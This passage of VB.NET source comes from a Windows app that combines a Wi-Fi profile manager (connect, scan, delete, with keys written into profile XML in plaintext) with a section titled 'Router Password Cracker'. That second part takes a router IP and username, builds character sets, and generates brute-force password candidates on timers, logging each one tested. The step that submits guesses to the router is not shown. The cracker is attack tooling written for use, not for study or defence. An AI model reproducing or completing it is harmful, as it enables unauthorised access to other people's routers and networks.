                        wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                        If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Authenticating Then
                            MsgBox("Network Security Key Mismatch", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        ElseIf wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                            MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        Else
                            'Starting Timer1
                            TimerA1.Start()
                        End If
                    Catch ex As Wlan.WlanException
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                    End Try
                End If
                'CASE 5 : Connects to a known network with WEP Encryption Type
            ElseIf security.Text = "Open" And encryption.Text = "WEP" Then
                If passbox.TextLength < 8 Then
                    MsgBox("The key or passphrase is incorrect.", MsgBoxStyle.Critical, "Error")
                    passbox.Clear()
                    passbox.Focus()
                    'Enabling some tools
                    lstNetworks.Enabled = True
                    btnConnect.Enabled = True
                    passbox.Enabled = True
                    passchkbox.Enabled = True
                    Exit Sub
                Else
                    Try
                        Dim profileXml As String = ""
                        Dim ssid, auth, enc, key As String
                        ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                        auth = "open"
                        enc = "WEP"
                        key = passbox.Text
                        profileXml = (("<?xml version=""1.0""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                        profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                        profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                        profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                        profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>networkKey</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                        profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                        wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
                        wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                        If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Authenticating Then
                            MsgBox("Network Security Key Mismatch", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        ElseIf wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                            MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                            wlanIface.DeleteProfile(ssid)
                            stat.Text = "Disconnecting..."
                            wlanIface.Disconnect()
                            'Starting Timer2
                            TimerA2.Start()
                        Else
                            'Starting Timer1
                            TimerA1.Start()
                        End If
                    Catch ex As Wlan.WlanException
                        MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                    End Try
                End If
                'CASE 6 : Connects to a known network without Security
            ElseIf security.Text = "Open" And encryption.Text = "None" Then
                Try
                    Dim profileXml As String = ""
                    Dim ssid, auth, enc, key As String
                    ssid = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                    auth = "open"
                    enc = "none"
                    key = passbox.Text
                    profileXml = (("<?xml version=""1.0""?>" & Environment.NewLine) & "<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">" & Environment.NewLine)
                    profileXml = ((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "<SSIDConfig>" & Environment.NewLine) & "<SSID>" & Environment.NewLine)
                    profileXml = (((((((String.Concat(New String() {profileXml, "<name>", ssid, "</name>", Environment.NewLine}) & "</SSID>" & Environment.NewLine) & "</SSIDConfig>" & Environment.NewLine) & "<connectionType>ESS</connectionType>" & Environment.NewLine) & "<connectionMode>auto</connectionMode>" & Environment.NewLine) & "<MSM>" & Environment.NewLine) & "<security>" & Environment.NewLine) & "<authEncryption>" & Environment.NewLine)
                    profileXml = String.Concat(New String() {profileXml, "<authentication>", auth, "</authentication>", Environment.NewLine})
                    profileXml = (((((String.Concat(New String() {profileXml, "<encryption>", enc, "</encryption>", Environment.NewLine}) & "<useOneX>false</useOneX>" & Environment.NewLine) & "</authEncryption>" & Environment.NewLine) & "<sharedKey>" & Environment.NewLine) & "<keyType>networkKey</keyType>" & Environment.NewLine) & "<protected>false</protected>" & Environment.NewLine)
                    profileXml = ((((String.Concat(New String() {profileXml, "<keyMaterial>", key, "</keyMaterial>", Environment.NewLine}) & "</sharedKey>" & Environment.NewLine) & "</security>" & Environment.NewLine) & "</MSM>" & Environment.NewLine) & "</WLANProfile>")
                    wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, True)
                    wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, ssid, 4000)
                    'Changing Status to "Connecting..."
                    stat.Text = "Connecting..."
                    'Disabling some tools & Clearing password TextBox
                    passbox.Enabled = False
                    passbox.Clear()
                    passchkbox.Enabled = False
                    btnConnect.Enabled = False
                    saved.Enabled = False
                    If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                        MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                        stat.Text = "Disconnecting..."
                        wlanIface.Disconnect()
                        'Starting Timer2
                        TimerA2.Start()
                    Else
                        'Starting Timer1
                        TimerA1.Start()
                    End If
                Catch ex As Wlan.WlanException
                    MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
                End Try
            Else
                MsgBox("Not Supported Yet....", MsgBoxStyle.Exclamation, "Sorry")
                'Clearing password textbox
                passbox.Clear()
                passbox.Focus()
                'Enabling some tools
                lstNetworks.Enabled = True
                btnConnect.Enabled = True
                passbox.Enabled = True
                passchkbox.Enabled = True
                Exit Sub
            End If
        Next
    End Sub
    'Codes for Disconnect Button
    Private Sub btn_disconnect_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_disconnect.Click
        'This is the code for disconnecting from Wi-Fi Network
        lstNetworks.Enabled = False
        Dim client As WlanClient = New WlanClient()
        For Each wlanIface2 As WlanClient.WlanInterface In client.Interfaces
            wlanIface2.Disconnect()
        Next
        stat.Text = "Disconnecting..."
        'Starting TimerA2
        TimerA2.Start()
        'Disabling some tools
        btnConnect.Enabled = False
        btn_disconnect.Enabled = False
        btn_refresh.Enabled = False
        passbox.Clear()
        passbox.Enabled = False
        passchkbox.Enabled = False
        delete.Enabled = False
        saved.Enabled = False
    End Sub
    'Codes for Refresh Button
    Private Sub btn_refresh_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_refresh.Click
        'This is the code for scanning available Wi-Fi networks
        stat.Text = "Scanning..."
        lstNetworks.Enabled = False
        btn_refresh.Enabled = False
        'First of all , we should clear items for every click to prevent duplication of Items in lstNetworks 
        lstNetworks.Items.Clear()
        Dim client As New WlanClient()
        Dim interface2 As WlanClient.WlanInterface
        For Each interface2 In client.Interfaces
            'Making a new scan for Wi-Fi networks
            interface2.Scan()
            Dim entry As Wlan.WlanBssEntry
            For Each entry In interface2.GetNetworkBssList
                Dim buffer As Byte() = entry.dot11Bssid
                Dim builder As New StringBuilder
                Dim num3 As Byte
                For Each num3 In buffer
                    builder.Append((num3.ToString("x2").ToUpper & ":"))
                Next
                Dim text As New String((Form1.GetStringForSSID(entry.dot11Ssid)))
                Dim item As New ListViewItem([text])
                If (Not Me.lstNetworks.Items.ContainsKey(item.Text) AndAlso (entry.dot11Ssid.SSID.Length > 0)) Then
                    Dim item2 As New ListViewItem([text]) With { _
                        .Name = [text] _
                    }
                    item2.SubItems.Add(builder.Remove((builder.Length - 1), 1).ToString)
                    item2.SubItems.Add("unknown")
                    item2.SubItems.Add("unknown2")
                    item2.SubItems.Add(entry.rssi.ToString() & " dbm")
                    item2.SubItems.Add((Convert.ToString(entry.linkQuality) & "% "))
                    item2.SubItems.Add(entry.dot11BssType.ToString())
                    item2.SubItems.Add("unknown3")
                    Me.lstNetworks.Items.Add(item2)
                    Dim num5 As Integer = CInt(Math.Round(CDbl((Conversion.Val(Me.lstNetworks.Items.Count) - 1))))
                End If
            Next
            If (Me.lstNetworks.Items.Count > 0) Then
                Dim network As Wlan.WlanAvailableNetwork
                For Each network In interface2.GetAvailableNetworkList(0)
                    Dim str3 As String = Encoding.ASCII.GetString(network.dot11Ssid.SSID).ToString
                    Dim str2 As New String(Form1.GetEncryptionState(network.dot11DefaultAuthAlgorithm.ToString))
                    Dim strx As New String(Form1.GetEncryptionType(network.dot11DefaultCipherAlgorithm.ToString))
                    Dim flag As New String(Form1.GetFlag(network.flags.ToString))
                    Dim item3 As ListViewItem = Me.lstNetworks.FindItemWithText(str3, False, 0)
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = "unknown")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = str2
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = "unknown2")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = strx
                    End If
                    If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = "unknown3")) Then
                        Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = flag
                    End If
                Next
            End If
        Next
        Me.lblNrRed.Text = Convert.ToString(Me.lstNetworks.Items.Count)
        'Disabling the connect button and Password Textbox1 and checkbox
        passbox.Enabled = False
        passbox.Clear()
        passchkbox.Enabled = False
        btnConnect.Enabled = False
        btn_disconnect.Enabled = False
        saved.Enabled = False
        delete.Enabled = False
        'Starting Timer1
        TimerA1.Start()
    End Sub
    'Code for clicking on blank area in lstNetworks
    Private Sub lstNetworks_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles lstNetworks.MouseDown
        Dim hti As ListViewHitTestInfo = lstNetworks.HitTest(e.Location)
        If hti.Location = ListViewHitTestLocations.None Then
            passchkbox.Enabled = False
            passbox.Enabled = False
            btnConnect.Enabled = False
            saved.Enabled = False
            delete.Enabled = False
        Else
            Exit Sub
        End If
    End Sub
    'Codes for selecting any Wi-Fi network in lstNetworks
    Private Sub lstNetworks_MouseClick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstNetworks.MouseClick
        'Enabling some tools
        passchkbox.Enabled = True
        passbox.Enabled = True
        btnConnect.Enabled = True
        If lstNetworks.SelectedItems.Count > 0 Then
            'This code writes the Security Type to Hidden TextBox2 > to make cases for Connect Function (WPA , WPA2 or Open)
            security.Text = lstNetworks.SelectedItems(0).SubItems(2).Text
            If security.Text = "unknown" Then
                MsgBox("This is a Hidden Network which is not supported yet.", MsgBoxStyle.Exclamation, "Warning...")
            End If
            'This code writes the Encryption Type to Hidden TextBox3 > to make cases for Connect Function (TKIP , AES , WEP or None)
            encryption.Text = lstNetworks.SelectedItems(0).SubItems(3).Text
            'This code writes the Flags to Hidden TextBox4 > to decide whether the profile is Saved or not
            savedOrnot.Text = lstNetworks.SelectedItems(0).SubItems(7).Text
        End If
        'For Open Network without security , Password Box is disabled
        If security.Text = "Open" And encryption.Text = "None" Then
            passbox.Clear()
            passbox.Enabled = False
            passchkbox.Enabled = False
        Else
            passbox.Enabled = True
        End If
        'If the network is saved , Connect (Saved Profile) Button is enabled
        If savedOrnot.Text = "Saved , Disconnected" Or savedOrnot.Text = "Saved , Connected" Then
            saved.Enabled = True
            delete.Enabled = True
        Else
            saved.Enabled = False
            delete.Enabled = False
        End If
    End Sub
    'Code to show or hide password characters
    Private Sub passchkbox_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles passchkbox.CheckedChanged
        passbox.Focus()
        If passchkbox.Checked = True Then
            passbox.UseSystemPasswordChar = False
        Else
            passbox.UseSystemPasswordChar = True
        End If
    End Sub
    'Code for connecting to saved Wi-Fi profile
    Private Sub saved_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles saved.Click
        ' This is the code for connecting to SAVED Wi-Fi Profile
        'Disabling some tools
        lstNetworks.Enabled = False
        btnConnect.Enabled = False
        passbox.Enabled = False
        passchkbox.Enabled = False
        saved.Enabled = False
        delete.Enabled = False
        Dim client As WlanClient = New WlanClient()
        For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
            Dim r = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
            Dim xmlDATA = wlanIface.GetProfileXml(r)
            Dim detail As sProfilDetail = ProfileDetail(xmlDATA)
            On Error Resume Next
            wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, xmlDATA, True)
            wlanIface.ConnectSynchronously(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, detail.SSID, 8000)
            If wlanIface.InterfaceState = Wlan.WlanInterfaceState.Associating Then
                MsgBox("Signal is too far", MsgBoxStyle.Critical, "Error")
                wlanIface.Disconnect()
                stat.Text = "Disconnecting..."
                'Starting TimerA2
                TimerA2.Start()
            Else
                stat.Text = "Connecting..."
                'Starting TimerA1
                TimerA1.Start()
            End If
        Next
    End Sub
    'This Opens AboutBox
    Private Sub about_manager_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles about_manager.LinkClicked
        AboutBox1.Show()
    End Sub
    'This is the code for deleting saved Wi-Fi profile
    Private Sub delete_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles delete.Click
        ' This is the code for deleting saved Wi-Fi profile
        Dim result = MsgBox("This will delete selected Wi-Fi Profie , Agree?", MsgBoxStyle.OkCancel Or MsgBoxStyle.Exclamation, "Warning")
        ' If the user clicked OK
        If result = MsgBoxResult.Ok Then
            Dim client As WlanClient = New WlanClient()
            For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
                Dim r = lstNetworks.SelectedItems(lstNetworks.SelectedItems.Count - 1).Text
                Dim xmlDATA = wlanIface.GetProfileXml(r)
                Dim detail As sProfilDetail = ProfileDetail(xmlDATA)
                On Error Resume Next
                wlanIface.DeleteProfile(detail.SSID)
                delete.Enabled = False
                MsgBox("Profile is deleted.", MsgBoxStyle.Information)
            Next
            'This is the code for scanning available Wi-Fi networks
            stat.Text = "Scanning..."
            lstNetworks.Enabled = False
            btn_refresh.Enabled = False
            'First of all , we should clear items for every click to prevent duplication of Items in lstNetworks 
            lstNetworks.Items.Clear()
            Dim interface2 As WlanClient.WlanInterface
            For Each interface2 In client.Interfaces
                Dim entry As Wlan.WlanBssEntry
                For Each entry In interface2.GetNetworkBssList
                    Dim buffer As Byte() = entry.dot11Bssid
                    Dim builder As New StringBuilder
                    Dim num3 As Byte
                    For Each num3 In buffer
                        builder.Append((num3.ToString("x2").ToUpper & ":"))
                    Next
                    Dim text As New String((Form1.GetStringForSSID(entry.dot11Ssid)))
                    Dim item As New ListViewItem([text])
                    If (Not Me.lstNetworks.Items.ContainsKey(item.Text) AndAlso (entry.dot11Ssid.SSID.Length > 0)) Then
                        Dim item2 As New ListViewItem([text]) With { _
                            .Name = [text] _
                        }
                        item2.SubItems.Add(builder.Remove((builder.Length - 1), 1).ToString)
                        item2.SubItems.Add("unknown")
                        item2.SubItems.Add("unknown2")
                        item2.SubItems.Add(entry.rssi.ToString() & " dbm")
                        item2.SubItems.Add((Convert.ToString(entry.linkQuality) & "% "))
                        item2.SubItems.Add(entry.dot11BssType.ToString())
                        item2.SubItems.Add("unknown3")
                        Me.lstNetworks.Items.Add(item2)
                        Dim num5 As Integer = CInt(Math.Round(CDbl((Conversion.Val(Me.lstNetworks.Items.Count) - 1))))
                    End If
                Next
                If (Me.lstNetworks.Items.Count > 0) Then
                    Dim network As Wlan.WlanAvailableNetwork
                    For Each network In interface2.GetAvailableNetworkList(0)
                        Dim str3 As String = Encoding.ASCII.GetString(network.dot11Ssid.SSID).ToString
                        Dim str2 As New String(Form1.GetEncryptionState(network.dot11DefaultAuthAlgorithm.ToString))
                        Dim strx As New String(Form1.GetEncryptionType(network.dot11DefaultCipherAlgorithm.ToString))
                        Dim flag As New String(Form1.GetFlag(network.flags.ToString))
                        Dim item3 As ListViewItem = Me.lstNetworks.FindItemWithText(str3, False, 0)
                        If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = "unknown")) Then
                            Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(2).Text = str2
                        End If
                        If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = "unknown2")) Then
                            Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(3).Text = strx
                        End If
                        If ((Not item3 Is Nothing) AndAlso (Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = "unknown3")) Then
                            Me.lstNetworks.Items.Item(item3.Index).SubItems.Item(7).Text = flag
                        End If
                    Next
                End If
            Next
            Me.lblNrRed.Text = Convert.ToString(Me.lstNetworks.Items.Count)
            'Disabling the connect button and Password Textbox1 and checkbox
            passbox.Enabled = False
            passbox.Clear()
            passchkbox.Enabled = False
            btnConnect.Enabled = False
            btn_disconnect.Enabled = False
            saved.Enabled = False
            delete.Enabled = False
            'Starting Timer1
            TimerA1.Start()
        Else
            MsgBox("Operation is cancelled", MsgBoxStyle.Information)
        End If
    End Sub
    'Code for Router Password Cracker - program(B)
    '-------------------------------------------------
    Dim sep As String = """"
    Dim tutti() As String = {" ", "!", sep, "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=", ">", "?", "@", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[", "\", "]", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "|", "}", "~", "", "€", "", "‚", "ƒ", "„", "…", "†", "‡", "ˆ", "‰", "Š", "‹", "Œ", "", "Ž", "", "", "‘", "’", """,""", "•", "–", "—", "˜", "™", "š", "›", "œ", "", "ž", "Ÿ", " ", "¡", "¢", "£", "¤", "¥", "¦", "§", "¨", "©", "ª", "«", "¬", "­", "®", "¯", "°", "±", "²", "³", "´", "µ", "¶", "·", "¸", "¹", "º", "»", "¼", "½", "¾", "¿", "À", "Á", "Â", "Ã", "Ä", "Å", "Æ", "Ç", "È", "É", "Ê", "Ë", "Ì", "Í", "Î", "Ï", "Ð", "Ñ", "Ò", "Ó", "Ô", "Õ", "Ö", "×", "Ø", "Ù", "Ú", "Û", "Ü", "Ý", "Þ", "ß", "à", "á", "â", "ã", "ä", "å", "æ", "ç", "è", "é", "ê", "ë", "ì", "í", "î", "ï", "ð", "ñ", "ò", "ó", "ô", "õ", "ö", "÷", "ø", "ù", "ú", "û", "ü", "ý", "þ", "ÿ"}
    Dim car_min() As String = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
    Dim car_maisc() As String = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
    Dim numeri() As String = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"}
    Dim simboli() As String = {" ", "!", sep, "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", ":", ";", "<", "=", ">", "?", "@", "[", "\", "]", "^", "_", "`", "{", "|", "}", "~"}
    Dim azzera_password As Integer = 0
    Dim password() As String = {"", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""}
    Dim temp_password() As String = {}
    Dim password_da_mandare As String = ""
    Dim lung_pass As Integer = password.Length - 1
    Dim lung_temp_pass As Integer = temp_password.Length - 1
    Dim pos As Integer
    Dim conta As Integer = lung_pass
    Dim avanza As Integer = 0
    Dim risultato As Integer = 0
    Dim avanza_piu_carattere As Integer = 0
    Dim completo As Integer = 0
    Dim crea_password As Integer = 0
    Dim scelta As Integer
    Dim avanz_resettabile As Integer ' Usato per la creazione della password temporanea.
    Dim avanz_totale As Integer ' come la variabile sopra  solo che viene resettata solo qando si preme resetta .
    Dim lung_scelta_corrente As Integer ' La lunghezza dell'array che verrai usata .
    Dim avanzamento_substring As Integer = 0
    Dim lung_testo As Integer
    Dim scorrimento As Integer = 0
    Dim sensore_reset As Integer = 0
    Dim pause As Integer = 0
    Dim nome_utente As String = ""
    Dim indirizzo_ip As String = ""
    Dim resetta As Integer = 0
    Dim tempo As String = "0"
    Dim secondi As String = "0"
    Dim minuti As String = "0"
    Dim ore As String = "0"
    '-----------------------------
    Private Sub Button1_Click_2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Button2.Enabled = True
        If pause = 1 And sensore_reset = 0 Then ' Inizio 1° IF
            Button2.Text = "Pause"
            pause = 0
            Button1.Enabled = False
        Else ' else del 1° IF

            ' Inizio mancanza di controlli .

            If TextBox1.Text = "" Then ' Inizio 2° IF

                Status_RPC.Top = 410
                Status_RPC.Left = 200
                Status_RPC.Text = "You forgot to enter the IP address of Router."
                resetta = 0
                TimerB3.Start()
                Exit Sub

            End If ' Fine 2° If

            If TextBox2.Text = "" Then ' Inizio 3° IF

                Status_RPC.Top = 410
                Status_RPC.Left = 200
                Status_RPC.Text = "You forgot to enter the User Name of Router."
                resetta = 0
                TimerB3.Start()
                Exit Sub

            End If ' Fine 3° IF

            ' Inizio 4° IF :
            If CheckBox1.Checked = False And CheckBox2.Checked = False And CheckBox3.Checked = False And CheckBox4.Checked = False And CheckBox5.Checked = False And CheckBox6.Checked = False Then

                Status_RPC.Top = 410
                Status_RPC.Left = 220
                Status_RPC.Text = "You forgot to set the characters to use."
                resetta = 0
                TimerB3.Start()
                Exit Sub

            End If ' Fine 4° IF

            If CheckBox6.Checked = True And TextBox4.Text = "" Then

                TextBox4.Focus()
                Status_RPC.Top = 410
                Status_RPC.Left = 220
                Status_RPC.Text = "You forgot to put a character in A Choice."
                resetta = 0
                TimerB3.Start()
                Exit Sub


            End If

            ' Fine mancanza di controlli .

            ' <> <> <> <> <> <> <> <> <> <> <> <> <> <> <> <> <> <> <> 

            ' Inizio Inizializzazione dati .

            Status_RPC.Top = 410
            Status_RPC.Left = 250
            Status_RPC.Text = "Initialization data in progress . . ."
            resetta = 0
            Thread.Sleep(50)
            TimerB3.Start()

            ' Inizio controllo per creazione della password :

            If CheckBox1.Checked = True Or CheckBox6.Checked = True Then

                If CheckBox1.Checked = True Then

                    temp_password = tutti

                Else

                    ' Inizio divisione  della textbox1.text

                    lung_testo = TextBox4.Text.Length

                    While avanzamento_substring < lung_testo

                        lung_temp_pass = temp_password.Length - 1

                        If lung_temp_pass = -1 Then ' Se l'array è vuoto allora :

                            ReDim Preserve temp_password(0)
                            temp_password(0) = TextBox4.Text.Substring(avanzamento_substring, 1)

                        Else

                            ReDim Preserve temp_password(lung_temp_pass + 1)
                            temp_password(avanzamento_substring) = TextBox4.Text.Substring(avanzamento_substring, 1)

                        End If

                        avanzamento_substring += 1

                    End While

                    avanzamento_substring = 0

                    ' Fine divisione  della textbox1.text

                End If

            Else ' Se ne checkbox1 ne checkbox6 sono attivi allora procedi con il resto del controllo :

                If CheckBox4.Checked = True Then

                    scelta = 4
                    avanz_resettabile = 0
                    crea_temp_password()

                End If

                If CheckBox3.Checked = True Then

                    scelta = 3
                    avanz_resettabile = 0
                    crea_temp_password()

                End If

                If CheckBox2.Checked = True Then

                    scelta = 2
                    avanz_resettabile = 0
                    crea_temp_password()

                End If

                If CheckBox5.Checked = True Then

                    scelta = 5
                    avanz_resettabile = 0
                    crea_temp_password()

                End If

            End If

            ' Fine controllo per creazione della password 

            If lung_pass = -1 Then

                lung_pass = 0
                ReDim Preserve password(0)

            End If

            If My.Computer.Network.IsAvailable = False Then

                Status_RPC.Top = 410
                Status_RPC.Left = 230
                Status_RPC.Text = "You can not connect to the router."
                Exit Sub

            End If

            nome_utente = TextBox2.Text
            indirizzo_ip = "http://" & TextBox1.Text

            lung_pass = password.Length - 1
            lung_temp_pass = temp_password.Length - 1

            ReDim Preserve temp_password(lung_temp_pass + 1)
            temp_password(lung_temp_pass + 1) = "fine"
            lung_temp_pass = temp_password.Length - 1

            avanza_piu_carattere = lung_pass

            If password(lung_pass) = "" Then ' Inizio 5° IF
                ' ReDim Preserve password(0)
                password(lung_pass) = temp_password(0)

            End If ' Fine 5° IF

            ' Fine Inizializzazione dati .

            Button2.Text = "Pause"
            Button1.Enabled = False

        End If ' Fineo 1° IF

        ' Avvio operazione :

        resetta = 0
        TimerB3.Stop()
        Status_RPC.Top = 410
        Status_RPC.Left = 300
        Status_RPC.Text = "Cracking password . . ."

        TimerB2.Start()
        TimerB1.Start()
        scorrimento = 1
        TimerB4.Start()

    End Sub

    Private Sub crea_temp_password()

        If scelta = 2 Then

            lung_scelta_corrente = numeri.Length

        End If

        If scelta = 3 Then

            lung_scelta_corrente = car_maisc.Length

        End If

        If scelta = 4 Then

            lung_scelta_corrente = car_min.Length

        End If

        If scelta = 5 Then

            lung_scelta_corrente = simboli.Length

        End If


        While avanz_resettabile <= lung_scelta_corrente - 1

            ReDim Preserve temp_password(avanz_totale)

            If scelta = 2 Then
                temp_password(avanz_totale) = numeri(avanz_resettabile)

            ElseIf scelta = 3 Then
                temp_password(avanz_totale) = car_maisc(avanz_resettabile)

            ElseIf scelta = 4 Then
                temp_password(avanz_totale) = car_min(avanz_resettabile)

            ElseIf scelta = 5 Then
                temp_password(avanz_totale) = simboli(avanz_resettabile)

            End If

            avanz_totale += 1
            avanz_resettabile += 1

        End While

        avanz_resettabile = 0

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerB1.Tick
        While avanza <= conta
            If password(avanza) = temp_password(lung_temp_pass) Then
                risultato += 1

            Else
                Exit While
            End If

            avanza += 1

        End While

        avanza = 0


        If risultato = (lung_pass - 1) Or risultato = lung_pass Then  ' Se mancano meno di 2 caratteri da modficare :

            If password(lung_pass - 1) = temp_password(lung_temp_pass) And password(lung_pass) = "fine" Then

                TimerB1.Stop()

                Exit Sub

            End If

            If password(lung_pass - 1) = temp_password(lung_temp_pass) Or password(lung_pass) = temp_password(lung_temp_pass) Then

                If password(lung_pass) = temp_password(lung_temp_pass) Then

                    password(lung_pass) = temp_password(0)
                    pos = Array.IndexOf(temp_password, password(lung_pass - 1))

                    If pos = -1 And password(lung_pass - 1) = "" Then
                        password(lung_pass - 1) = temp_password(0)
                    Else

                        password(lung_pass - 1) = temp_password(pos + 1)

                    End If

                End If

            End If ' Fine controllo meno di 2 caratteri da fare < - - - - - - - - - - - >


        Else ' Se mancano più di 2 caratteri da modficare :

            While avanza_piu_carattere > risultato ' Inizio While per controllare l'avanzamento della password .

                If password(avanza_piu_carattere) = "fine" Then ' Inizio del 1° IF

                    password(avanza_piu_carattere) = temp_password(0)

                    pos = Array.IndexOf(temp_password, password(avanza_piu_carattere - 1))

                    If pos = -1 Or password(avanza_piu_carattere - 1) = "" Then ' Inizio del 2° IF

                        password(avanza_piu_carattere - 1) = temp_password(0)

                    ElseIf password(avanza_piu_carattere - 1) = temp_password(lung_temp_pass) Then

                        password(avanza_piu_carattere - 1) = "fine"

                    Else ' Else del 2° IF

                        password(avanza_piu_carattere - 1) = temp_password(pos + 1)

                    End If ' Fine del 2° IF

                    avanza_piu_carattere -= 1

                Else ' se il carattere della password non è l'ultimo carattere della temp_password allora esci dal While .

                    Exit While

                End If ' Fine del 1° IF

            End While ' Fine del ciclo While .

        End If ' Fine controllo più di 2 caratteri da fare < - - - - - - - - - - - >

        While crea_password <= conta  ' Inizio While per unire la password da mandare al Router .

            If password(crea_password) = "" Then

            Else
                password_da_mandare &= password(crea_password)
            End If

            crea_password += 1

        End While                                         ' Fine While per unire la password da mandare al Router .

        ListBox1.Items.Add("Password tested : " & password_da_mandare) ' Visualizza la password appena testata .

        pos = Array.IndexOf(temp_password, password(lung_pass))

        avanza_piu_carattere = lung_pass

        ' <+++ Inizio pezzo di codice usato in più +++>

        If risultato = (lung_pass + 1) Then
            TimerB1.Stop()
            Me.WindowState = FormWindowState.Normal
            Status_RPC.Top = 410
            Status_RPC.Left = 160
            Status_RPC.Text = "I ended up with no results , try other combinations."
            TimerB4.Stop()
